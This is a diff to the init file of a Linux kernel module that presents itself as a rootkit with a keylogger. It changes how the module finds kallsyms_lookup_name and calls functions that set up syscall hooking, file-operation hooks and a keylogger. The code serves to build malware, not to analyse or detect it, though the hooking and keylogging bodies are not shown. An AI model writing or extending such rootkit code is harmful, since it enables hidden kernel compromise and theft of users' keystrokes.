@@ -2,6 +2,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/fs.h>
+#include <linux/kallsyms.h>
 #include "simple_rootkit.h"
 #include "fops.h"
 #include "keylogger.h"
@@ -14,12 +15,11 @@ MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 
 // module paramters
-unsigned long lookup_addr = 0;
-module_param(lookup_addr, ulong, S_IRUGO);
-MODULE_PARM_DESC(lookup_addr, "The address of kallsyms_lookup_name function from /proc/kallsyms");
+// unsigned long lookup_addr = 0;
+// module_param(lookup_addr, ulong, S_IRUGO);
+// MODULE_PARM_DESC(lookup_addr, "The address of kallsyms_lookup_name function from /proc/kallsyms");
 
 static int __init rootkit_init(void) {
-	init_etc(lookup_addr);
 	init_hooking();
 	init_fops();
 	init_keylogger();
